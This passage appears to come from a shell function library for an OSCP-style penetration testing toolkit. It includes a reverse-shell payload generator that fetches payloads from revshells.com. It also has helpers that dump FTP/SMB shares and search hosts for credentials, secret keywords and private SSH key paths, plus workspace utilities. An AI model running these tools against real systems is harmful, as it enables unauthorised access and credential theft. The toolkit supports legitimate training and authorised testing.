    [[ "$statistic" == true ]] && swiss_logger info "[i] Statistics saved to $stat_file"
}

# Description: dump files from FTP or SMB service
# Usage: dump <service name> <ip> [service options]
# Arguments:
#   - service name: ftp, smb
#   - ip: IP address of the target machine
# Example:
#   dump ftp $target_ip -u username -p password
#   dump smb $target_ip -s share
# Category: [ ftp, smb, file-transfer ]
# TODO: optimize the logic using flags
function dump() { 
    _help() {
        swiss_logger info "Usage: dump <service name> <ip> [service options]"
        swiss_logger info "* ftp"
        swiss_logger info "\t[optional] -u, --username (default: anonymous)"
        swiss_logger info "\t[optional] -p, --password (default: anonymous)"
        swiss_logger info "* smb"
        swiss_logger info "\t[required] -s, --share"
    }

    local service="$1"
    local ip="$2"
    shift 2;
    if [[ -z "$service" ]] || [[ -z "$ip" ]]; then
        _help
        return 1
    fi

    case "$service" in
        ftp)
            swiss_logger info "[i] dump from FTP"
            local username="anonymous"
            local password="anonymous"
            while [[ $# -gt 0 ]]; do
                case $1 in
                    -u|--username)
                        username="$2"
                        shift 2
                        ;;
                    -p|--password)
                        password="$2"
                        shift 2
                        ;;
                    *)
                        shift 1
                        ;;
                esac
            done
            wget -r --no-passive --no-parent ftp://$username:$password@$ip
            ;;
        smb)
            swiss_logger info "[i] dump from SMB"
            local username=""
            local password=""
            local share=""
            while [[ $# -gt 0 ]]; do
                case $1 in
                    -s|--share)
                        share="$2"
                        shift 2
                        ;;
                    *)
                        shift 1
                        ;;
                esac
            done

            if [[ -z "$share" ]]; then
                _help
                return 1
            fi

            smbclient //$ip/$share -N -c 'prompt OFF;recurse ON;cd; lcd '$PWD';mget *'
            ;;
        *)
            swiss_logger error "[e] Invalid service '$service'. Valid service: ftp, smb"
            return 1
            ;;
    esac
}

# Description: lookup an IP address's public information
# Usage: target_ipinfo <ip>
# Category: [ recon, network ]
# TODO: input validation
function target_ipinfo() {
  curl https://ipinfo.io/$1/json
}

# Description: lookup the public IP address of the host
# Usage: host_public_ip
# Category: [ network ]
function host_public_ip() {
    curl ipinfo.io/ip
}

# Description:
#   function `cheatsheet` display a list of your cheatsheet files 
#   and allow you to select one to view its contents.
#   This can be useful for quick reference to common commands or syntax.
#   Path of your cheatsheet files is defined in the `cheatsheet_dir` variable.
#   Only support for .md files.
# Usage: cheatsheet
# Category: [ ]
# TODO: configurable cheatsheet directory
function cheatsheet() {
    local cheatsheet_dir="$HOME/oscp-swiss/doc/cheatsheet"
    local files=()
    local original_files=()

    for file in "$cheatsheet_dir"/*.md; do    
        if [[ -f "$file" ]]; then
            original_files+=("$file")
            # Format filename for display: remove leading number, replace dashes with spaces, capitalize
            formatted_name=$(basename "$file" .md | sed 's/^[0-9]*-//' | sed 's/-/ /g' | awk '{for(i=1;i<=NF;i++) $i=toupper(substr($i,1,1)) substr($i,2)}1')
            files+=("$formatted_name")
        fi
    done

    # Check if there are any files to display
    if [[ ${#files[@]} -eq 0 ]]; then
        swiss_logger warn "[w] No cheatsheet files found in $cheatsheet_dir."
        return 1
    fi

    swiss_logger warn info "[i] Available Cheatsheets:"
    for ((i=1; i<=${#files[@]}; i++)); do
        swiss_logger info "$((i)). ${files[$i]}"
    done

    swiss_logger prompt "[i] Select a cheatsheet by number: \c"
    read choice

    if [[ $choice -gt 0 && $choice -le ${#files[@]} ]]; then
        local index=$((choice))
        swiss_logger info "[i] Displaying contents: ${original_files[$index]}:"
        cat "${original_files[$index]}"
    else
        swiss_logger warn "[w] Invalid selection."
    fi
}

# Usage: rev_shell
# TODO: Doc
# TODO: built-in encode
# TODO: env default port
# TODO: list options for shell type
# TODO: fix revshell issue on 42 (Powershell base64)
# Category: [ rce ]
function rev_shell() {
    swiss_logger prompt "[i] Enter IP (Default: $(_get_default_network_interface_ip)): \c"
    read -r IP
    local IP=${IP:-$(_get_default_network_interface_ip)}

    swiss_logger prompt "[i] Port (Default: 9000): \c"
    read -r PORT
    local PORT=${PORT:-9000}

    local -a allowed_shell_types=("sh" "/bin/sh" "bash" "/bin/bash" "cmd" "powershell" "pwsh" "ash" "bsh" "csh" "ksh" "zsh" "pdksh" "tcsh" "mksh" "dash")

    function is_valid_shell_type() {
        local shell="$1"
        for valid_shell in "${allowed_shell_types[@]}"; do
            if [[ "$shell" == "$valid_shell" ]]; then
                return 0
            fi
        done
        return 1
    }

    while true; do
        swiss_logger prompt "[i] Enter Shell (Default: /bin/bash): \c"
        read -r SHELL_TYPE
        SHELL_TYPE=${SHELL_TYPE:-"/bin/bash"}

        if is_valid_shell_type "$SHELL_TYPE"; then
            break
        else
            swiss_logger error "[e] Invalid SHELL_TYPE. Allowed values are: ${allowed_shell_types[*]}"
        fi
    done

    # stripping color
    swiss_logger info ""

    local PS3="Please select the Mode (number): "
    local -a bash_options=( "Bash -i" "Bash 196" "Bash read line" "Bash 5" "Bash udp" "nc mkfifo" "nc -e" "nc.exe -e" "BusyBox nc -e" "nc -c" "ncat -e" "ncat.exe -e" "ncat udp" "curl" "rustcat" "C" "C Windows" "C# TCP Client" "C# Bash -i" "Haskell #1" "OpenSSL" "Perl" "Perl no sh" "Perl PentestMonkey" "PHP PentestMonkey" "PHP Ivan Sincek" "PHP cmd" "PHP cmd 2" "PHP cmd small" "PHP exec" "PHP shell_exec" "PHP system" "PHP passthru" "PHP \`" "PHP popen" "PHP proc_open" "Windows ConPty" "PowerShell #1" "PowerShell #2" "PowerShell #3" "PowerShell #4 (TLS)" "PowerShell #3 (Base64)" "Python #1" "Python #2" "Python3 #1" "Python3 #2" "Python3 Windows" "Python3 shortest" "Ruby #1" "Ruby no sh" "socat #1" "socat #2 (TTY)" "sqlite3 nc mkfifo" "node.js" "node.js #2" "Java #1" "Java #2" "Java #3" "Java Web" "Java Two Way" "Javascript" "Groovy" "telnet" "zsh" "Lua #1" "Lua #2" "Golang" "Vlang" "Awk" "Dart" "Crystal (system)" "Crystal (code)")

    local MODE
    select MODE in "${bash_options[@]}"; do
      if [[ -n "$MODE" ]]; then
        swiss_logger info "[i] Mode $MODE selected."
        local ENCODED_MODE=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$MODE'''))")
        break
      else
        swiss_logger error "[e] Invalid selection, please try again."
      fi
    done

    local ENCODED_SHELL=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$SHELL_TYPE'''))")
    local URL="https://www.revshells.com/${ENCODED_MODE}?ip=${IP}&port=${PORT}&shell=${ENCODED_SHELL}"

    swiss_logger debug "[d] Request=$URL"
    local HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${URL}")

    if [[ "$HTTP_STATUS" -eq 200 ]]; then
        curl -s "${URL}" | xclip -selection clipboard
        swiss_logger info "[i] payload copied."
    else
        swiss_logger error "[e] Status $HTTP_STATUS"
    fi
}

# TODO: Doc
# Category: [ http ]
function url_encode() {
    local string="${1}"
    printf '%s' "${string}" | jq -sRr @uri
}

# TODO: Doc
# Category: [ target:http ]
function url_decode() {
    local string="${1//+/ }"
    printf '%s' "$string" | perl -MURI::Escape -ne 'print uri_unescape($_)'
}

# TODO: Doc
function atob() {
    echo -n "$1" | base64 --decode
}

# TODO: Doc
function btoa() {
    echo -n "$1" | base64
}

# TODO: Doc
# Category: [ func:rce, func:pe ]
function msfsearch() {
    msfconsole -q -x "search $@; exit"
}

# TODO: Doc
# Description:
# Usage:
#   - swiss_find -f|--filename [directory (default .)]
#   - swiss_find -c|--content [directory (default .)]
#   - swiss_find -sf|--search-filename <keyword> [path (default .)]
#   - swiss_find -sc|--search-content <keyword> [path (default .)]
# Arguments:
# Example:
# Category: 
function swiss_find() {
    case $1 in
        -f|--filename)
            local find_path="${2:-$PWD}"
            local ignore_list=("./usr/src/*" "./var/lib/*" "./etc/*" "./usr/share/*" "./snap/*" "./sys/*" "./usr/lib/*" "./usr/bin/*" "./run/*" "./boot/*" "./usr/sbin/*" "./proc/*" "./var/snap/*")
            local search_items=("*.txt" "*.sqlite" "*conf*" "*data*" "*.pdf" "*.apk" "*.cfg" "*.json" "*.ini" "*.log" "*.sh" "*password*" "*cred*" "*.env" "config" "HEAD" "*mbox" "*.sdf")

            find_command="find $find_path -type f"

            for ignore in "${ignore_list[@]}"; do
            find_command+=" \( -path \"$ignore\" -prune \) -o"
            done

            find_command+=" \("
            for item in "${search_items[@]}"; do
            find_command+=" -name \"$item\" -o"
            done

            find_command="${find_command% -o} \) -type f -print 2>/dev/null"
            
            eval "$find_command"

            swiss_logger info "[i] Hidden files (.*)\n"
            \find $find_path -type f -name ".*" 2>/dev/null
            ;;
        -c|--content)
            local find_path="${2:-$PWD}"
            swiss_logger info "[i] Finding keywords in files"
            grep -Erl "(user|username|login|pass|passwd|password|pw|credentials|flag|local|proof|db_username|db_passwd|db_password|db_user|db_host|database|api_key|api_token|access_token|private_key|jwt|auth_token|bearer|ssh_pass|ssh_key|identity_file|id_rsa|id_dsa|authorized_keys|env|environment|secret|admin|root)" $find_path 2>/dev/null
            ;;
        -sf|--search-filename)
            if [ -z "$2" ]; then
                swiss_logger error "[e] Missing keyword"
                return 1
            fi

            local find_path="${3:-$PWD}"
            swiss_logger info "[i] Searching for filename containing '$2':"
            find $find_path -type f -name "*$1*" 2>/dev/null
            ;;
        -sc|--search-content)
            if [ -z "$2" ]; then
                logger error "[e] Missing keyword"
                return 1
            fi

            local find_path="${3:-$PWD}"
            swiss_logger info "[i] Searching for file contents containing '$2':"
            grep -r --include="*" "$2" $find_path 2>/dev/null
            ;;
        *)
            swiss_logger error "[e] unsupported function"
            return 1
            ;;
    esac
}

# TODO: Doc
# Description:
# Usage:
# Arguments:
# Example:
# Category: 
function list_all_ssh_credential_path() {
    local input="$1"
    local algos=("id_rsa" "id_dsa" "id_ecdsa" "id_ed25519")

    # file mode
    if [[ -f "$input" ]]; then
        while IFS= read -r user; do
            for algo in "${algos[@]}"; do
                echo "/home/$user/.ssh/$algo"
            done
        done < "$input"
    else
        # single username
        for algo in "${algos[@]}"; do
            echo "/home/$input/.ssh/$algo"
        done
    fi
}

# Description: 
#   Command `memory` is a cheatsheet function for your binaries, scripts, and all files you keep.
#   You can take notes and read it effortlessly to find what you need rapidly.
#   All the notes are stored under `/doc/utils-note.md`.
#   For example, you can add a note by running the command: `memory /home/kali/oscp-swiss/utils/windows/GodPotato`
#   If it is not a valid file/directory, it will print out the error
#   If it is a valid file/directory:
#       - If there's no note under `/doc/utils-note.md`, it will ask whether you want to create a note
#       - If there's note, the note will be printed by cat
#   Note formats (.md):
#   ```md
#   # $filename
#   ## Description: $description
#   ## Path: $path
#   ## Usage:
#   <-- Declare the usage here -->
#   ````
# Usage: memory <$path>
# Variable:
#   - path: path is a filepath or a path to a directory. If it is a file path, it will shows the file's note (if exist). If it is a directory, it will list all files under the directory (with the description).
# Example: memory utils/windows
# Category:
function memory() {
    _helper() {
        swiss_logger info "memorize [mode] [options] <$PATH>"
        swiss_logger info "[Mode]"
        swiss_logger info "-m, --mode: <add, view, default>"
        swiss_logger info "  in add mode, you can add notes"
        swiss_logger info "  in view mode, path (for both file and directory) will display their notes"
        swiss_logger info "  in default mode, path will have different display:"
        swiss_logger info "      - file: display the notes"
        swiss_logger info "      - directory: display a tree structure showing with the description"
        swiss_logger info "[Options]"
        swiss_logger info "  -s, --shortcut <shortcut_name>: can add a shortcut for files"
        swiss_logger info "  -st, --shortcut-type <shortcut_type>: type of shortcuts. Current support: alias, extension (default: extension)"
        swiss_logger highlight "[H] Filename MUST BE IDENTICAL. The function uses filename to search."
        swiss_logger highlight "[H] For adding notes, the description should be short. Otherwise it will impact the diplay when you view in tree mode."
    }
    local notes_path="$HOME/oscp-swiss/doc/utils-note.md"
    local utils_base_path=$swiss_utils
    local mode="default"
    local shortcut_name=""
    local shortcut_type="extension"
    local input_path

    while [[ $# -gt 0 ]]; do
        case $1 in
            -m|--mode)
                mode="$2"
                if [[ ! "$mode" =~ ^(default|view|add)$ ]]; then
                    swiss_logger error "[e] mode support: default, view, add"
                    return 1
                fi
                shift 2
                ;;
            -s|--shortcut)
                shortcut_name="$2"
                shift 2
                ;;
            -st|--shortcut-type)
                shortcut_type="$2"
                if [[ ! "$shortcut_type" =~ ^(extension|alias)$ ]]; then
                    swiss_logger error "[e] shortcut_type support: extension, alias"
                    return 1
                fi
                shift 2
                ;;
            -h|--help)
                _helper
                return 0
                ;;
            *)
                input_path="$1"
                shift 1
                ;;
        esac
    done

    swiss_logger debug "[d] Mode: $mode"

    local absolute_path=""
    local relative_path=""

    if [[ "$input_path" == "$utils_base_path"* ]]; then
        relative_path="${input_path/#$utils_base_path//utils}"
        absolute_path=$input_path
    else
        relative_path=$input_path
        absolute_path="$utils_base_path/$relative_path"
    fi

    local filename=$(basename "$absolute_path")

    if [[ ! -e "$absolute_path" ]]; then
        swiss_logger error "[e] Path '$absolute_path' does not exist."
        return 1
    fi

    if [[ "$absolute_path" != "$utils_base_path"* ]]; then
        swiss_logger "[e] Only files under $utils_base_path are allowed."
    fi

    _add_note() {
        if grep -q "^# $filename$" "$notes_path"; then
            swiss_logger warn "[w] Notes exists already."
            return 0
        fi

        if [[ ! -z "$shortcut_name" ]]; then
            shortcut -f $absolute_path -n $shortcut_name -t $shortcut_type
        fi

        local temp_note="$mktemp.md"
        {
            echo "# Utils: $filename"
            echo "## Description: "
            echo "## Path: $relative_path"
            echo "## Shortcut: $shortcut_name"
            echo "## Usage:"
            echo "<-- Declare the usage here -->"
            echo ""
        } > "$temp_note"

        vim "$temp_note"
        \cat "$temp_note" >> "$notes_path"
        rm "$temp_note"
        swiss_logger info "[u] Note saved to $notes_path."
    }

    _view_note() {
        if grep -q "^# Utils: $filename$" "$notes_path"; then
            swiss_logger debug "[d] Note found for $filename:"
            output=$(sed -n "/^# Utils: $filename$/,/^# Utils: /{ /^# Utils: $filename$/b; /^# Utils: /q; p }" "$notes_path")
            if [ $_swiss_cat_use_pygmentize = true ]; then
                swiss_logger debug "[d] Use pygementize"
                local temp_md="$mktemp.md"
                echo $output >> $temp_md
                cat $temp_md
                rm $temp_md
            else
                echo $output
            fi
        else
            swiss_logger warn "[w] No notes found."
        fi
    }

    if [[ -d "$absolute_path" ]]; then
        case $mode in
            add)
                _add_note
                ;;
            view)
                _view_note
                ;;
            default)
                swiss_logger debug "[d] Directory detected. Listing files with descriptions:"
                tree -C "$absolute_path" -L 1 | while read -r line; do
                    filename=$(echo "$line" | sed 's/\x1B\[[0-9;]*[a-zA-Z]//g' | awk '{print $NF}')
                    if grep -q "^# Utils: $filename$" "$notes_path"; then
                        local description=$(grep -A 1 "^# Utils: $filename$" "$notes_path" | grep '^## Description' | cut -d':' -f2-)
                        echo -e "$line \033[33m$description\033[0m"
                    else
                        echo "$line"
                    fi
                done
                ;;
            *)
                swiss_logger error "[e] Mode type incorrect."
                return 1
                ;;
        esac
    elif [[ -f "$absolute_path" ]]; then
        case $mode in
            add)
                _add_note
                ;;
            view)
                _view_note
                ;;
            default)
                _view_note
                ;;
            *)
                swiss_logger error "[e] Mode type incorrect."
                return 1
                ;;
        esac
    else
        swiss_logger error "[e] '$absolute_path' is neither a valid file nor a directory."
    fi
}

# TODO: Doc
# Category: [ ]
function shortcut() {
    local file_path
    local name
    local type="extension"

    _helper() {
        swiss_logger info "Usage: shortcut <-f, --file FILE> <-n, --name VARIABLE_NAME> [-t, --type VARIABLE_TYPE]"
        swiss_logger info "Type supported: extension, alias (Default: extension)"
    }

    while [[ $# -gt 0 ]]; do
        case $1 in
            -f|--file)
                file_path="$2"
                shift 2
                ;;
            -n|--name)
                name="$2"
                shift 2
                ;;
            -t|--type)
                type="$2"
                if [[ ! "$type" =~ ^(extension|alias)$ ]]; then
                    swiss_logger error "[e] type support: alias, extension"
                    return
                fi
                shift 2
                ;;
            *)
                shift 1
                ;;
        esac
    done

    if [[ "$file_path" != /* ]]; then
        file_path="$(realpath "$file_path")"
    fi

    if [ ! -f "$file_path" ] && [ ! -d "$file_path" ]; then
        swiss_logger error "[e] The file path $file_path does not exist."
        return 1
    fi

    file_path="${file_path/#$HOME/\$HOME}"

    if [ -z "$name" ]; then
        swiss_logger error "[e] Required a name for the shortcut"
    fi

    local dest
    [[ "$type" == "extension" ]] && dest=$swiss_extension || dest=$swiss_alias

    if [ -n "$(tail -c 1 "$dest")" ]; then
        echo >> "$dest"
    fi

    echo "$name=\"$file_path\"" >> "$dest"
    swiss_logger info "[i] Variable $name for $file_path has been added to $type."
}

# Description: function to check all predefined shortcuts under the extension.sh
# Usage: check_extension
# Category: [ prep ]
function check_extension() {
    local alias_file="$swiss_extension"
    while IFS= read -r line; do
        [[ -z "$line" || ! "$line" =~ "=" || "$line" =~ ^# ]] && continue
        local var_name="${line%%=*}"
        local file_path="${line#*=}"
        [[ ! "$var_name" =~ ^[a-zA-Z_][a-zA-Z0-9_]*$ ]] && continue
        file_path="${file_path%\"}"
        file_path="${file_path#\"}"

        eval expanded_file_path="$file_path"

        if [[ ! -e "$expanded_file_path" ]]; then
            swiss_logger warn "[w] $var_name is invalid or does not exist: $expanded_file_path"
        fi
    done < "$alias_file"
}

# Description: go to the path defined as workspace (cross-session)
# Usage: go_workspace
# Category: [ func: shortcut ]
function go_workspace() {
    if [ "$_swiss_workspace_auto_cleanup" = true ]; then     
        check_workspace
    fi

    local cur_workspace_path
    cur_workspace_path=$(jq -r '.swiss_variable.workspace.cur.path // empty' "$swiss_settings")

    if [[ -n "$cur_workspace_path" && -d "$cur_workspace_path" ]]; then
        cd "$cur_workspace_path" || { echo "[e] Failed to navigate to directory '$cur_workspace_path'"; return 1; }
    else
        echo "[e] Workspace path is empty or does not exist"
    fi
}

# # Description:
# #   Generate workspace for pen test. Including:
# #       - Create a directory with the format <name>-<ip>
# #       - Create username.txt and password.txt
# #       - Set the current path as workspace, you can use go_workspace to jump to the workspace across sessions
# #       - Set the target IP address, you can use get_target to copy the target IP address to the clipboard
# #       - Copy the ip to the clipboard
# # Usage: init_workspace
# # Category: [ prep ]
function init_workspace() {
    local name=""
    local ip=""

    _helper() {
        swiss_logger info "[i] Usage: init_workspace <-n, --name workspace_name> <-i, --ip IP>"
    }

    while [[ "$#" -gt 0 ]]; do
        case "$1" in
            -i|--ip)
                ip="$2"
                shift 2
                ;;
            -n|--name)
                name="$2"
                shift 2
                ;;
            *)
                shift
                ;;
        esac
    done

    if [[ -z "$name" || -z "$ip" ]]; then
        _helper
        return 1
    fi
    local dir_name="${name}-${ip}"
    echo $dir_name
    mkdir -p "$dir_name"
    cd "$dir_name" || { swiss_logger error "[e] Failed to enter directory '$dir_name'"; return 1; }

    touch username.txt
    touch password.txt

    set_workspace $PWD $ip
}

# Description: set the workspace path and target
# Usage: set_workspace <workspace_path> <workspace_target>
# Category: [ ]
function set_workspace() {
    local workspace_path="$1"
    local workspace_target="$2"

    if [[ -d "$workspace_path" ]]; then
        jq --arg path "$workspace_path" '.swiss_variable.workspace.cur.path = $path' "$swiss_settings" > tmp.$$.json && mv tmp.$$.json "$swiss_settings"
        swiss_logger debug "[d] Current workspace path set to $workspace_path"
    else
        swiss_logger error "[e] Directory '$workspace_path' does not exist"
        return 1
    fi

    jq --arg target "$workspace_target" '.swiss_variable.workspace.cur.target = $target' "$swiss_settings" > tmp.$$.json && mv tmp.$$.json "$swiss_settings"
    swiss_logger debug "[d] Target set to $workspace_target"

    local exists_in_list
    exists_in_list=$(jq --arg path "$workspace_path" --arg target "$workspace_target" \
        '.swiss_variable.workspace.list[] | select(.path == $path and .target == $target)' "$swiss_settings")

    if [[ -z "$exists_in_list" ]]; then
        jq --arg path "$workspace_path" --arg target "$workspace_target" \
            '.swiss_variable.workspace.list += [{"path": $path, "target": $target}]' "$swiss_settings" > tmp.$$.json && mv tmp.$$.json "$swiss_settings"
        swiss_logger debug "[d] Workspace added to list: $workspace_path with target $workspace_target"
    else
        swiss_logger debug "[d] Workspace already exists in the list"
    fi

    # set variable
    target="$workspace_target"
}

# Description: select a workspace from the list
# Usage: select_workspace
# Category: [ ]
function select_workspace() {
    if [ "$_swiss_workspace_auto_cleanup" = true ]; then     
        check_workspace
    fi

    local paths
    paths=($(jq -r '.swiss_variable.workspace.list[].path' "$swiss_settings"))
    
    if [ ${#paths[@]} -lt 1 ]; then
        swiss_logger info "[i] No workspace found."
        return 0
    fi

    swiss_logger prompt "Please choose a workspace:"
    for ((i=1; i<=${#paths[@]}; i++)); do
        swiss_logger prompt "$((i)). ${paths[i]}"
    done

    swiss_logger prompt "Enter your choice: \c"
    read choice

    if [[ "$choice" -gt 0 && "$choice" -le "${#paths[@]}" && -d "${paths[choice]}" ]]; then

        selected_path="${paths[choice]}"
        selected_target=$(jq -r ".swiss_variable.workspace.list[$choice].target" "$swiss_settings")
        jq --arg path "$selected_path" --arg target "$selected_target" \
           '.swiss_variable.workspace.cur = { "path": $path, "target": $target }' "$swiss_settings" > tmp.$$.json && mv tmp.$$.json "$swiss_settings"

        cd $selected_path || { swiss_logger error "[e] Failed to enter directory '${paths[choice]}'"; return 1; }
    else
        swiss_logger error "[e] Invalid choice or directory does not exist"
    fi
}

# Description: check all workspaces' paths are exist. If a workspace does not exist, it will be removed automatically
# Usage: check_workspace
# Category: [ ]
function check_workspace() {
    local updated_list=()

    jq -c '.swiss_variable.workspace.list[]' "$swiss_settings" | while read -r item; do
        local cur_path=$(echo "$item" | jq -r '.path')
        if [[ -d "$cur_path" ]]; then
            updated_list+=("$item")
        else
            swiss_logger info "[i] Removing non-existent workspace path: $cur_path"
        fi
    done

    jq --argjson list "$(printf '%s\n' "${updated_list[@]}" | jq -s '.')" '.swiss_variable.workspace.list = $list' "$swiss_settings" > tmp.$$.json && mv tmp.$$.json "$swiss_settings"
    
    local cur_workspace_path
    cur_workspace_path=$(jq -r '.swiss_variable.workspace.cur.path // empty' "$swiss_settings")

    if [[ -n "$cur_workspace_path" && ! -d "$cur_workspace_path" ]]; then
        swiss_logger info "[i] Current workspace path does not exist: $cur_workspace_path"
        jq '.swiss_variable.workspace.cur = {}' "$swiss_settings" > tmp.$$.json && mv tmp.$$.json "$swiss_settings"
    fi
}

# Description:
#   - get the target IP address and copy it to the clipboard.
#   - set the variable `target` to the target IP address
# Usage: get_target
# Category: [ ]
function get_target() {
    cur_target=$(jq -r '.swiss_variable.workspace.cur.target // ""' "$swiss_settings")

    if [[ -z $target ]]; then
        target=$cur_target
        echo $cur_target | xclip -selection clipboard
    fi
}

spawn_session_in_workspace